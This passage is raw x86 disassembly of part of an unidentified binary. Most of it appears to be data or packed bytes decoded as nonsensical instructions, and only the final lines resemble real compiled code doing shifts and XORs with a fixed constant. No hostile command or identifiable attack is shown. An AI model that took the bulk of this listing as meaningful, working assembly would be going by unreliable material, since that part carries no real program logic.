  41c162:	aam    0x76
  41c164:	hlt    
  41c165:	mov    al,ds:0x1b0d7f2b
  41c16a:	outs   dx,BYTE PTR ds:[esi]
  41c16b:	repz pop DWORD PTR fs:[ecx+0x59]
  41c170:	sub    dl,BYTE PTR [ebx+0x5]
  41c173:	rol    DWORD PTR [ecx-0x26b83226],1
  41c179:	aad    0x44
  41c17b:	int    0x8f
  41c17d:	inc    esp
  41c17e:	xor    al,0xb7
  41c180:	dec    ebp
  41c181:	push   ds
  41c182:	push   0xa99fd24d
  41c187:	jle    0x41c1ed
  41c189:	sub    eax,0x2e0587f2
  41c18e:	jne    0x41c14c
  41c190:	or     ecx,DWORD PTR [esi-0x1665a15]
  41c196:	jg     0x41c163
  41c198:	stos   DWORD PTR es:[edi],eax
  41c199:	push   DWORD PTR ds:0xd8b884fd
  41c19f:	das    
  41c1a0:	jmp    0x4ea0d403
  41c1a5:	adc    bh,BYTE PTR [edi]
  41c1a7:	add    ecx,esi
  41c1a9:	add    esi,DWORD PTR [ecx-0x1c44c813]
  41c1af:	dec    esp
  41c1b0:	mov    bl,0x49
  41c1b2:	dec    ecx
  41c1b3:	cdq    
  41c1b4:	rcr    DWORD PTR [eax],cl
  41c1b6:	mov    dh,0x87
  41c1b8:	or     BYTE PTR [eax+0x60],al
  41c1bb:	rol    DWORD PTR [eax+ebx*4],1
  41c1be:	mov    eax,ds:0x57fdb00e
  41c1c3:	shl    ecx,cl
  41c1c5:	clc    
  41c1c6:	push   esi
  41c1c7:	inc    edi
  41c1c8:	and    edx,DWORD PTR [eax+0x6fe98d32]
  41c1ce:	sbb    ch,BYTE PTR [esi+ecx*8-0x105867d1]
  41c1d5:	add    DWORD PTR [ebx+0x6945dac],ecx
  41c1db:	jp     0x41c22e
  41c1dd:	push   ss
  41c1de:	adc    DWORD PTR ds:0xd4abf51c,ebx
  41c1e4:	movq   QWORD PTR [edi+edx*4+0x66],mm6
  41c1e9:	popf   
  41c1ea:	add    eax,0x1cbabbee
  41c1ef:	shl    edi,1
  41c1f1:	in     eax,dx
  41c1f2:	jg     0x41c270
  41c1f4:	dec    esi
  41c1f5:	fld    QWORD PTR [eax-0xd]
  41c1f8:	loop   0x41c270
  41c1fa:	out    0x69,al
  41c1fc:	pushf  
  41c1fd:	je     0x41c1d5
  41c1ff:	cwde   
  41c200:	into   
  41c201:	lahf   
  41c202:	loopne 0x41c1b2
  41c204:	xor    DWORD PTR [edi-0x1bd80faa],eax
  41c20a:	sbb    eax,0x6c526014
  41c20f:	adc    al,0x36
  41c211:	ins    DWORD PTR es:[edi],dx
  41c212:	leave  
  41c213:	aam    0x2c
  41c215:	xor    BYTE PTR [ebp-0xf],0x25
  41c219:	xor    eax,0xd90e3b4e
  41c21e:	xor    al,0x22
  41c220:	pop    ecx
  41c221:	popf   
  41c222:	ins    BYTE PTR es:[edi],dx
  41c223:	jle    0x41c1e3
  41c225:	push   ecx
  41c226:	adc    dl,BYTE PTR [edi]
  41c228:	lahf   
  41c229:	mov    ebx,0x15d9db35
  41c22e:	or     ah,BYTE PTR ds:0x4e2ad80f
  41c234:	mov    edi,DWORD PTR [eax+0x52952803]
  41c23a:	mov    ecx,0x4307a9b7
  41c23f:	shl    BYTE PTR [eax],0xa0
  41c242:	(bad)  
  41c244:	jmp    FWORD PTR [edi+ebx*8-0x4a5d517b]
  41c24b:	add    eax,0xf8ec8778
  41c250:	loopne 0x41c231
  41c252:	adc    eax,0xc8c077b4
  41c257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c258:	push   esp
  41c259:	das    
  41c25a:	sbb    edi,ebx
  41c25c:	(bad)  
  41c25d:	mov    dh,0x80
  41c25f:	in     al,0xa3
  41c261:	add    eax,0xbc04175a
  41c266:	inc    ecx
  41c267:	int    0x9
  41c269:	lods   eax,DWORD PTR ds:[esi]
  41c26a:	dec    eax
  41c26b:	xchg   ebx,eax
  41c26c:	addr16 sub al,0x74
  41c26f:	popa   
  41c270:	dec    ebx
  41c271:	ss sub al,ah
  41c274:	xor    al,0x34
  41c276:	int    0x39
  41c278:	(bad)  
  41c279:	adc    DWORD PTR [eax-0x78],edx
  41c27c:	std    
  41c27d:	push   ebx
  41c27e:	(bad)  
  41c280:	xchg   ecx,eax
  41c281:	(bad)  
  41c282:	ja     0x41c2ff
  41c284:	sub    eax,0x917c2ed4
  41c289:	out    dx,eax
  41c28a:	push   esi
  41c28b:	repz and cl,ah
  41c28e:	or     ecx,DWORD PTR [ecx-0x6dcba590]
  41c294:	sbb    eax,0x8e80f87b
  41c299:	out    0xa2,eax
  41c29b:	mov    cl,BYTE PTR [edi-0x59]
  41c29e:	lahf   
  41c29f:	or     eax,0x53cff68a
  41c2a4:	jg     0x41c283
  41c2a6:	jo     0x41c2ed
  41c2a8:	pop    edi
  41c2a9:	cmp    edx,DWORD PTR [esi*1+0x67615933]
  41c2b0:	mov    ecx,0x1c3056da
  41c2b5:	clc    
  41c2b6:	xor    al,0x46
  41c2b8:	out    0xde,eax
  41c2ba:	lods   eax,DWORD PTR ds:[esi]
  41c2bb:	ins    BYTE PTR es:[edi],dx
  41c2bc:	inc    esp
  41c2bd:	fnstenv [esi]
  41c2bf:	add    BYTE PTR [edi],dh
  41c2c1:	inc    eax
  41c2c2:	push   ebp
  41c2c3:	aad    0xa3
  41c2c5:	aad    0x74
  41c2c7:	pop    ebx
  41c2c8:	lds    eax,FWORD PTR [ecx+0x5e]
  41c2cb:	push   ss
  41c2cc:	jnp    0x41c2a1
  41c2ce:	lea    ecx,[edx]
  41c2d0:	mov    bl,0xbe
  41c2d2:	mov    eax,ds:0x2eee6cac
  41c2d7:	retf   
  41c2d8:	in     eax,dx
  41c2d9:	sar    BYTE PTR [eax],cl
  41c2db:	out    0xdc,eax
  41c2dd:	(bad)  
  41c2df:	loop   0x41c328
  41c2e1:	xor    bh,BYTE PTR [edi]
  41c2e3:	xlat   BYTE PTR ds:[ebx]
  41c2e4:	xchg   ebx,eax
  41c2e5:	mov    esp,0x4b3f42cd
  41c2ea:	pop    ss
  41c2eb:	in     al,dx
  41c2ec:	mov    edx,0xc7f18996
  41c2f1:	pop    esp
  41c2f2:	rcl    BYTE PTR [edx+0x4c],1
  41c2f5:	scas   eax,DWORD PTR es:[edi]
  41c2f6:	ret    0x4a5e
  41c2f9:	sub    BYTE PTR [edx+0x7d],ah
  41c2fc:	cwde   
  41c2fd:	mov    BYTE PTR [eax-0x4],cl
  41c300:	imul   DWORD PTR [ecx]
  41c302:	mov    esi,ss
  41c304:	mov    ebp,0x19b42b4a
  41c309:	mov    ds:0x45cfdbc0,eax
  41c30e:	push   ss
  41c30f:	mov    ds:0x24220702,al
  41c314:	ficomp WORD PTR [edi]
  41c316:	and    esi,0xffffffc4
  41c319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c31a:	int3   
  41c31b:	das    
  41c31c:	inc    ebx
  41c31d:	ss pusha 
  41c31f:	push   edx
  41c320:	(bad)  
  41c321:	int    0xd8
  41c323:	bound  edx,QWORD PTR [esi]
  41c325:	iret   
  41c326:	frstor [ecx-0x35]
  41c329:	rcr    dl,0x3
  41c32c:	pop    edx
  41c32d:	cmc    
  41c32e:	mov    esp,0xc30fffed
  41c333:	(bad)  
  41c334:	cld    
  41c335:	jmp    0x7acf7975
  41c33a:	jae    0x41c337
  41c33c:	xor    al,0x61
  41c33e:	pop    edx
  41c33f:	dec    eax
  41c340:	jle    0x41c2e8
  41c342:	out    dx,eax
  41c343:	inc    ebx
  41c344:	imul   BYTE PTR ss:[ebx]
  41c347:	adc    dh,BYTE PTR [eax+0x49]
  41c34a:	scas   al,BYTE PTR es:[edi]
  41c34b:	push   ds
  41c34c:	lock sbb esp,0x9863c0b1
  41c353:	test   al,0x4d
  41c355:	aam    0xc2
  41c357:	popf   
  41c358:	mov    edi,0xd2b83a98
  41c35d:	pop    ss
  41c35e:	dec    ecx
  41c35f:	jecxz  0x41c39b
  41c361:	sbb    cl,BYTE PTR cs:[edx+0x9f1d031]
  41c368:	xor    eax,0xe34f3cc2
  41c36d:	xchg   ebx,eax
  41c36e:	dec    ebp
  41c36f:	jns    0x41c3a8
  41c371:	imul   esi,edi,0x67f1aff7
  41c377:	out    dx,eax
  41c378:	jno    0x41c321
  41c37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c37b:	mov    ebx,0x483e02df
  41c380:	mov    edx,0xc248dae2
  41c385:	addr16 (bad) 
  41c388:	adc    BYTE PTR [esi+0x183e00a5],al
  41c38e:	mov    eax,0x197014c3
  41c393:	fs (bad) 
  41c395:	sbb    cl,BYTE PTR [ecx+0x22]
  41c398:	pushf  
  41c399:	xor    DWORD PTR [ecx+0x26],esi
  41c39c:	stc    
  41c39d:	int3   
  41c39e:	sbb    al,0x1c
  41c3a0:	push   ecx
  41c3a1:	cwde   
  41c3a2:	jae    0x41c348
  41c3a4:	add    eax,0x8135f2c3
  41c3a9:	mov    bl,0xa6
  41c3ab:	xchg   esp,eax
  41c3ac:	cld    
  41c3ad:	popa   
  41c3ae:	fmulp  st(0),st
  41c3b0:	fsubr  QWORD PTR [esi]
  41c3b2:	pop    esp
  41c3b3:	sub    eax,DWORD PTR [esi+ebp*2-0x42e1e770]
  41c3ba:	data16 (bad) 
  41c3bc:	mov    al,ds:0x61025ae0
  41c3c1:	in     eax,0x5d
  41c3c3:	and    eax,DWORD PTR [edx]
  41c3c5:	jmp    0xd9465242
  41c3ca:	xor    eax,0x5221b065
  41c3cf:	sbb    BYTE PTR [ecx+0x5466c320],ah
  41c3d5:	adc    edx,DWORD PTR [eax+0x5647b70]
  41c3db:	jp     0x41c3c6
  41c3dd:	ror    BYTE PTR [ebx],1
  41c3df:	cdq    
  41c3e0:	shl    DWORD PTR [ebp+0x41],0x35
  41c3e4:	push   ebp
  41c3e5:	popf   
  41c3e6:	dec    ecx
  41c3e7:	ret    
  41c3e8:	clc    
  41c3e9:	cmp    dl,BYTE PTR [esi-0x9]
  41c3ec:	mov    eax,ds:0x1392d16e
  41c3f1:	(bad)  
  41c3f2:	adc    eax,0x6a197d2b
  41c3f7:	sub    al,BYTE PTR [eax]
  41c3f9:	ins    DWORD PTR es:[edi],dx
  41c3fa:	call   0x15b50aa6
  41c3ff:	fbld   TBYTE PTR [eax-0xd]
  41c402:	mov    al,ds:0x1b678023
  41c407:	dec    eax
  41c408:	lock mov eax,ds:0xaff760e1
  41c40e:	adc    al,BYTE PTR [eax]
  41c410:	adc    BYTE PTR [ecx+0x333aedfd],cl
  41c416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c418:	adc    al,ch
  41c41a:	fcmovnbe st,st(7)
  41c41c:	data16 arpl WORD PTR [ebx+0xaa04052],bp
  41c423:	into   
  41c424:	inc    edi
  41c425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c426:	jp     0x41c460
  41c428:	sub    ebp,DWORD PTR [edi-0x26]
  41c42b:	sbb    BYTE PTR [edi],dl
  41c42d:	jne    0x41c4ae
  41c42f:	mov    bl,0x6d
  41c431:	fist   WORD PTR [eax+0x5b]
  41c434:	in     al,dx
  41c435:	lahf   
  41c436:	sahf   
  41c437:	fcmovnu st,st(2)
  41c439:	out    0x88,eax
  41c43b:	jl     0x41c404
  41c43d:	pop    es
  41c43e:	outs   dx,DWORD PTR ds:[esi]
  41c43f:	ds xchg ebx,eax
  41c441:	xchg   edi,eax
  41c442:	fcomp  QWORD PTR [ebx]
  41c444:	jge    0x41c3ca
  41c446:	inc    ebx
  41c447:	mov    ah,BYTE PTR [ecx]
  41c449:	test   DWORD PTR [edi-0x40],ebp
  41c44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c44d:	push   0x7f7be395
  41c452:	sti    
  41c453:	ret    0xd303
  41c456:	push   esp
  41c457:	push   ebx
  41c458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c459:	ins    BYTE PTR es:[edi],dx
  41c45a:	inc    ecx
  41c45b:	repnz mov ?,WORD PTR [eax-0x2c]
  41c45f:	ja     0x41c45a
  41c461:	mov    ah,0x37
  41c463:	add    DWORD PTR [ebp+0x33],0xffffffe5
  41c467:	je     0x41c4ae
  41c469:	pusha  
  41c46a:	in     al,0x39
  41c46c:	jl     0x41c429
  41c46e:	sbb    al,0x35
  41c470:	xchg   ebp,eax
  41c471:	mov    ch,0x92
  41c473:	pop    edi
  41c474:	push   0x34
  41c476:	dec    esi
  41c477:	inc    esi
  41c478:	pop    ebx
  41c479:	mov    esp,0x6697ae7a
  41c47e:	call   0x35928a0f
  41c483:	cs (bad) 
  41c485:	fidivr DWORD PTR [ebx]
  41c487:	lods   eax,DWORD PTR ds:[esi]
  41c488:	imul   edx,DWORD PTR [ebp+0x7449091f],0x183b8be7
  41c492:	xor    eax,esi
  41c494:	cmp    al,0xcb
  41c496:	mov    ebp,0x7efd0677
  41c49b:	aas    
  41c49c:	sub    eax,0x18102cd5
  41c4a1:	shr    BYTE PTR [ebp+0x7c8c1b30],cl
  41c4a7:	adc    al,0x95
  41c4a9:	pop    ebp
  41c4aa:	fstp   TBYTE PTR [esi+edi*4-0x4ad188a4]
  41c4b1:	pop    edx
  41c4b2:	lods   al,BYTE PTR ds:[esi]
  41c4b3:	test   eax,0xff891ce8
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c536
  41c4cb:	dec    BYTE PTR [ebx+0x16734a70]
  41c4d1:	sbb    BYTE PTR [edx+edx*1-0x3dc9e7e8],bh
  41c4d8:	in     eax,0x2e
  41c4da:	sbb    edi,0xaae246ad
  41c4e0:	enter  0xeb1d,0x0
  41c4e4:	push   0x54bc8b97
  41c4e9:	add    DWORD PTR [esi-0x464b6e35],0xffffffdb
  41c4f0:	dec    ebx
  41c4f1:	popa   
  41c4f2:	repnz push ebx
  41c4f4:	xlat   BYTE PTR ds:[ebx]
  41c4f5:	jae    0x41c528
  41c4f7:	mov    edx,0x242637dc
  41c4fc:	push   ss
  41c4fd:	sub    ah,BYTE PTR [edi-0x58]
  41c500:	sti    
  41c501:	out    0x43,al
  41c503:	xchg   edx,eax
  41c504:	sahf   
  41c505:	and    BYTE PTR [edx+0x492f5014],0x18
  41c50c:	or     BYTE PTR [ebx],bl
  41c50e:	jl     0x41c505
  41c510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c511:	push   edi
  41c512:	mov    cl,0x64
  41c514:	aam    0x82
  41c516:	mov    edi,0xc2af1c37
  41c51b:	push   edx
  41c51c:	jmp    0x79e68752
  41c521:	inc    edi
  41c522:	loope  0x41c578
  41c524:	scas   al,BYTE PTR es:[edi]
  41c525:	test   DWORD PTR es:[edx+0x72e8fcf3],ecx
  41c52c:	repz fsubrp st(0),st
  41c52f:	cli    
  41c530:	int3   
  41c531:	cmp    ch,0xdb
  41c534:	retf   
  41c535:	inc    eax
  41c536:	fwait
  41c537:	xor    al,0x87
  41c539:	sar    BYTE PTR [edi-0x4],1
  41c53c:	add    bl,ah
  41c53e:	iret   
  41c53f:	shl    BYTE PTR [edi],0xc1
  41c542:	pop    ebx
  41c543:	and    al,al
  41c545:	mov    esp,0x576393ae
  41c54a:	ins    DWORD PTR es:[edi],dx
  41c54b:	lods   al,BYTE PTR ds:[esi]
  41c54c:	mov    al,0xf8
  41c54e:	std    
  41c54f:	inc    ebx
  41c550:	lods   eax,DWORD PTR ds:[esi]
  41c551:	out    0xd8,eax
  41c553:	xor    esp,DWORD PTR [ecx+0x3]
  41c556:	mov    ecx,0x45d16873
  41c55b:	mov    edi,0xf00c5a4c
  41c560:	adc    eax,0x4ae652dd
  41c565:	iret   
  41c566:	mov    dh,0xe8
  41c568:	cdq    
  41c569:	cmp    al,al
  41c56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c56c:	pop    ebp
  41c56d:	mov    al,ds:0xcb6dec67
  41c572:	(bad)  
  41c573:	es and al,0x22
  41c576:	(bad)  
  41c577:	cmp    dh,BYTE PTR [esi]
  41c579:	shr    al,cl
  41c57b:	sbb    BYTE PTR [ecx+0x51],dl
  41c57e:	push   esi
  41c57f:	popa   
  41c580:	add    bh,0xc5
  41c583:	mov    ds:0x198ec02e,eax
  41c588:	gs jb  0x41c5f1
  41c58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c58c:	(bad)  
  41c58d:	in     eax,dx
  41c58e:	pop    ds
  41c58f:	shl    DWORD PTR [ebp*2-0x68182210],cl
  41c596:	lock movs WORD PTR es:[edi],WORD PTR ds:[esi]
  41c599:	imul   esp,ebp,0x55
  41c59c:	cmc    
  41c59d:	mov    DWORD PTR [eax+0x6c9bd910],ebp
  41c5a3:	daa    
  41c5a4:	lods   al,BYTE PTR ds:[esi]
  41c5a5:	(bad)  
  41c5a6:	fiadd  WORD PTR [eax+0x160629ca]
  41c5ac:	jg     0x41c5f8
  41c5ae:	test   BYTE PTR [ebx+0x2aff02c2],0xbc
  41c5b5:	in     al,dx
  41c5b6:	aaa    
  41c5b7:	dec    esi
  41c5b8:	stos   DWORD PTR es:[edi],eax
  41c5b9:	adc    ebp,DWORD PTR [esi]
  41c5bb:	mov    BYTE PTR [edx],bh
  41c5bd:	call   0x7a0845c5
  41c5c2:	xor    DWORD PTR [edx-0x47],esp
  41c5c5:	sub    bl,BYTE PTR [ecx-0x60012f63]
  41c5cb:	mov    ebx,DWORD PTR [edi+0x70555a4]
  41c5d1:	sbb    ebx,DWORD PTR [eax]
  41c5d3:	iret   
  41c5d4:	jmp    0x598b:0x81c165b9
  41c5db:	call   0xb608:0x475c1d6
  41c5e2:	or     DWORD PTR [ecx+0xb6f4600],esi
  41c5e8:	pop    edx
  41c5e9:	ficom  WORD PTR [eax-0xeaac0b5]
  41c5ef:	(bad)  
  41c5f0:	mov    bh,0xe8
  41c5f2:	pop    esi
  41c5f3:	jle    0x41c5fb
  41c5f5:	mov    eax,ds:0x97d7984a
  41c5fa:	pop    es
  41c5fb:	jg     0x41c662
  41c5fd:	les    edx,FWORD PTR [ecx-0xd49ae9f]
  41c603:	hlt    
  41c604:	mov    es,WORD PTR [edx-0x30fa43b1]
  41c60a:	mov    al,ds:0xa176da23
  41c60f:	or     edx,ebp
  41c611:	dec    edi
  41c612:	pop    esp
  41c613:	mov    dl,0x19
  41c615:	fwait
  41c616:	inc    ebx
  41c617:	xchg   BYTE PTR [edi],ch
  41c619:	push   cs
  41c61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c61b:	mov    ch,0xc1
  41c61d:	inc    ebx
  41c61e:	dec    ebx
  41c61f:	pop    edi
  41c620:	ins    BYTE PTR es:[edi],dx
  41c621:	push   0xf6165cbc
  41c626:	jg     0x41c632
  41c628:	retf   
  41c629:	and    eax,0x4d18435e
  41c62e:	stc    
  41c62f:	pop    ecx
  41c630:	cmp    al,0xfd
  41c632:	pop    eax
  41c633:	xor    ecx,eax
  41c635:	pop    ebx
  41c636:	jno    0x41c5c6
  41c638:	pop    esi
  41c639:	hlt    
  41c63a:	in     eax,dx
  41c63b:	mov    ch,0x17
  41c63d:	xchg   ecx,eax
  41c63e:	cmp    eax,0xd14a2401
  41c643:	jge    0x41c643
  41c645:	lds    ecx,FWORD PTR [ebx]
  41c647:	sub    DWORD PTR [edx-0x65],ebx
  41c64a:	scas   eax,DWORD PTR es:[edi]
  41c64b:	mov    ds:0x83a37210,eax
  41c650:	add    BYTE PTR [ebx+0x5a9d2eef],dh
  41c656:	enter  0x913e,0xfb
  41c65a:	xchg   DWORD PTR [esi+0x4a],ecx
  41c65d:	and    BYTE PTR [ecx],0x16
  41c660:	or     BYTE PTR [eax+0xd],bl
  41c663:	cmp    esp,esi
  41c665:	mov    gs,WORD PTR [eax+0x719cdf36]
  41c66b:	sub    esp,0xc
  41c66e:	push   cs
  41c66f:	xchg   ebx,eax
  41c670:	cmp    al,0x91
  41c672:	hlt    
  41c673:	in     eax,0x6b
  41c675:	call   0xfbeac86a
  41c67a:	push   esp
  41c67b:	loope  0x41c6c4
  41c67d:	jb     0x41c6fa
  41c67f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c680:	or     al,0x69
  41c682:	jle    0x41c62b
  41c684:	and    bh,BYTE PTR [esi-0x9]
  41c687:	in     eax,0x7b
  41c689:	out    0xba,al
  41c68b:	outs   dx,DWORD PTR ds:[esi]
  41c68c:	hlt    
  41c68d:	dec    edx
  41c68e:	mov    bh,0xc9
  41c690:	test   DWORD PTR [edi],ebx
  41c692:	sbb    eax,0xaee33d5a
  41c697:	push   ecx
  41c698:	pop    ecx
  41c699:	fcmovnu st,st(2)
  41c69b:	cli    
  41c69c:	in     eax,dx
  41c69d:	push   cs
  41c69e:	lahf   
  41c69f:	push   edi
  41c6a0:	push   ds
  41c6a1:	xor    DWORD PTR [edi-0x3817f87c],ebp
  41c6a7:	jne    0x41c70e
  41c6a9:	inc    ebp
  41c6aa:	mov    edi,0x4a4c3594
  41c6af:	add    BYTE PTR [ecx+0x29],dl
  41c6b2:	pop    ds
  41c6b3:	inc    eax
  41c6b4:	add    BYTE PTR [edx],bl
  41c6b6:	inc    eax
  41c6b7:	fucomip st,st(5)
  41c6b9:	jecxz  0x41c68f
  41c6bb:	ss mov dl,0x7b
  41c6be:	mov    dh,cl
  41c6c0:	pop    esp
  41c6c1:	cli    
  41c6c2:	mov    bh,0xf7
  41c6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c5:	sub    DWORD PTR [edi+ebp*2+0x450e8ef6],0x364e4ca7
  41c6d0:	xchg   edx,eax
  41c6d1:	les    esi,FWORD PTR ds:0xaed61dcc
  41c6d7:	icebp  
  41c6d8:	inc    esi
  41c6d9:	or     BYTE PTR [ebp+0x2a],al
  41c6dc:	or     BYTE PTR [ebp+0xd],ch
  41c6df:	mov    eax,ds:0xa5e64461
  41c6e4:	push   0xb
  41c6e6:	fiadd  WORD PTR [eax+0x76]
  41c6e9:	and    eax,0xaf772058
  41c6ee:	nop
  41c6ef:	mov    ebp,0x171b4d31
  41c6f4:	aad    0x64
  41c6f6:	add    dl,BYTE PTR ds:0x46a25dcd
  41c6fc:	xchg   esi,eax
  41c6fd:	ret    0x1a0b
  41c700:	xlat   BYTE PTR ds:[ebx]
  41c701:	test   al,0x1c
  41c703:	mov    ss,ebp
  41c705:	daa    
  41c706:	adc    esi,edx
  41c708:	dec    ecx
  41c709:	jge    0x41c751
  41c70b:	pusha  
  41c70c:	data16 stc 
  41c70e:	pop    ds
  41c70f:	push   0xffffff84
  41c711:	inc    edi
  41c712:	and    dh,dh
  41c714:	xor    eax,0xa0b8b145
  41c719:	iret   
  41c71a:	mov    ah,0xb6
  41c71c:	inc    ecx
  41c71d:	rdpmc  
  41c71f:	jl     0x41c6f7
  41c721:	mov    cl,0x8f
  41c723:	dec    edx
  41c724:	fisttp WORD PTR [edx]
  41c726:	xchg   ecx,eax
  41c727:	out    dx,eax
  41c728:	out    0xc8,eax
  41c72a:	in     eax,dx
  41c72b:	(bad)  
  41c72c:	loop   0x41c6f6
  41c72e:	test   eax,0x92fc7475
  41c733:	sbb    al,0xb0
  41c735:	inc    ebp
  41c736:	inc    edi
  41c737:	mov    dl,0x94
  41c739:	(bad)  
  41c73a:	pop    ebp
  41c73b:	cli    
  41c73c:	sbb    ebx,DWORD PTR [ecx]
  41c73e:	aaa    
  41c73f:	xchg   ebx,eax
  41c740:	test   DWORD PTR ds:0x119f3c5e,0x67e25537
  41c74a:	bound  edi,QWORD PTR [edx-0x38893ff]
  41c750:	inc    ebx
  41c751:	push   es
  41c752:	mov    esp,cs
  41c754:	sbb    esi,DWORD PTR [edx-0x3d]
  41c757:	jmp    0xec51:0x8a3bd3ee
  41c75e:	adc    eax,0x3ed8adba
  41c763:	push   ebx
  41c764:	inc    edx
  41c765:	xlat   BYTE PTR ds:[ebx]
  41c766:	pop    ebp
  41c767:	mov    dl,0x51
  41c769:	push   cs
  41c76a:	cmp    eax,0xda45a964
  41c76f:	loop   0x41c793
  41c771:	jmp    0x255:0x16c2fb4c
  41c778:	jmp    0xefa2:0x9fcc8d96
  41c77f:	jbe    0x41c73d
  41c781:	ror    BYTE PTR [eax-0xf4e0654],1
  41c787:	or     BYTE PTR ds:0x6b7b907e,0x3f
  41c78e:	ds neg dh
  41c791:	ret    0xbea1
  41c794:	push   ss
  41c795:	pop    ebx
  41c796:	cdq    
  41c797:	add    BYTE PTR ds:[edi+0x409921ff],ch
  41c79e:	mov    ch,0x9
  41c7a0:	mov    ds:0x7063d684,eax
  41c7a5:	xchg   ecx,eax
  41c7a6:	cs push 0xf27b2f02
  41c7ac:	pop    ecx
  41c7ad:	sub    ah,BYTE PTR [eax+eax*8+0x55]
  41c7b1:	popa   
  41c7b2:	xchg   ecx,eax
  41c7b3:	cmc    
  41c7b4:	int3   
  41c7b5:	pxor   mm4,mm0
  41c7b8:	mov    ebp,0x2a782e56
  41c7bd:	(bad)  
  41c7be:	dec    ebp
  41c7bf:	mov    al,ds:0xac8ab05a
  41c7c4:	mov    esi,0xae3f5096
  41c7c9:	cmp    DWORD PTR ds:0xfa5edcbc,esp
  41c7cf:	lods   al,BYTE PTR ds:[esi]
  41c7d0:	mov    cl,0x9f
  41c7d2:	mov    ch,0xe6
  41c7d4:	push   ss
  41c7d5:	retf   
  41c7d6:	xchg   ecx,eax
  41c7d7:	inc    esi
  41c7d8:	imul   ecx,DWORD PTR [eax-0x7a],0xdb308a81
  41c7df:	in     eax,dx
  41c7e0:	add    al,0xa9
  41c7e2:	push   0x9e30a2ef
  41c7e7:	sbb    DWORD PTR [edx+0x5f047c66],0xd4110c70
  41c7f1:	dec    edx
  41c7f2:	rol    DWORD PTR [eax-0xe],cl
  41c7f5:	cmp    cl,0x6b
  41c7f8:	mov    ebx,0x1b21a56d
  41c7fd:	popa   
  41c7fe:	call   0x8a1005cf
  41c803:	xchg   edi,eax
  41c804:	mov    ecx,0x705e7f1b
  41c809:	push   0xa1912c9c
  41c80e:	xchg   edi,eax
  41c80f:	dec    ebp
  41c810:	cmp    esp,eax
  41c812:	xchg   edi,eax
  41c813:	cmp    BYTE PTR [eax],cl
  41c815:	jle    0x41c844
  41c817:	ret    0xad3
  41c81a:	cmc    
  41c81b:	xor    DWORD PTR [edi+edi*1],ecx
  41c81e:	out    0x9e,eax
  41c820:	arpl   WORD PTR [esi],dx
  41c822:	repz xchg esi,eax
  41c824:	ror    BYTE PTR [ecx],1
  41c826:	or     dl,BYTE PTR [edx+0x3c9e2169]
  41c82c:	loop   0x41c841
  41c82e:	mov    dl,0x89
  41c830:	mov    ah,0xdd
  41c832:	inc    ecx
  41c833:	inc    ecx
  41c834:	sbb    eax,0xc3f8f568
  41c839:	gs push ecx
  41c83b:	cdq    
  41c83c:	call   0x92ae9747
  41c841:	retf   0x6950
  41c844:	xacquire xchg DWORD PTR ds:0xa67a382,ecx
  41c84b:	sbb    DWORD PTR [edx],0x97b26939
  41c851:	test   BYTE PTR [ebp+ecx*8+0x3],al
  41c855:	outs   dx,DWORD PTR ds:[esi]
  41c856:	push   edx
  41c857:	fmul   st,st(3)
  41c859:	inc    esi
  41c85a:	test   ebp,eax
  41c85c:	dec    esp
  41c85d:	bound  ecx,QWORD PTR [ecx+0x4392745e]
  41c863:	jmp    0xc051:0x8100ff66
  41c86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86b:	shr    dh,cl
  41c86d:	pop    esp
  41c86e:	popa   
  41c86f:	pop    es
  41c870:	in     al,0x71
  41c872:	adc    ah,BYTE PTR [edx+0xc]
  41c875:	es and eax,0x5133e6a9
  41c87b:	add    bl,BYTE PTR ds:0xe242a3af
  41c881:	call   FWORD PTR [edi-0x64]
  41c884:	ret    
  41c885:	add    cl,BYTE PTR [esi+0x2474ffa8]
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
